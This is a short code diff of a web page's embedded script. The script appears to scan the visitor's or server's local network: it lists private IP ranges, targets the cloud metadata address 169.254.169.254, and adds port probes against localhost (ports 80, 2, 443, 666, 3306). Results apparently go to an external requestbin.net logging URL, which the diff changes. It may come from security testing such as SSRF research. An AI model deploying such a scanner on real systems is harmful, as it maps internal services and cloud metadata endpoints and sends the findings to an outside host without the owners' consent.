@@ -10,7 +10,7 @@
     <div id="custom_button"></div>
     
     <script>
-    let LOG_URL = "http://requestbin.net/r/9oesgaz0";
+    let LOG_URL = "http://requestbin.net/r/66r5ocuf";
     let LOCAL_HOST = "169.254.169.254";
     let ipIterator="";
     let local_ip_ranges = ["10.", "192.168.", "172.16."];
@@ -303,6 +303,10 @@
       }
   }
       custom_scan("127.0.0.1", "80");
+      custom_scan("127.0.0.1", "2");
+      custom_scan("127.0.0.1", "443");
+      custom_scan("127.0.0.1", "666");
+      custom_scan("127.0.0.1", "3306");
       //custom_scan("169.254.169.254", "443");
       //custom_scan("15.207.101.96", "443");
       //custom_scan("15.207.101.96", "21");
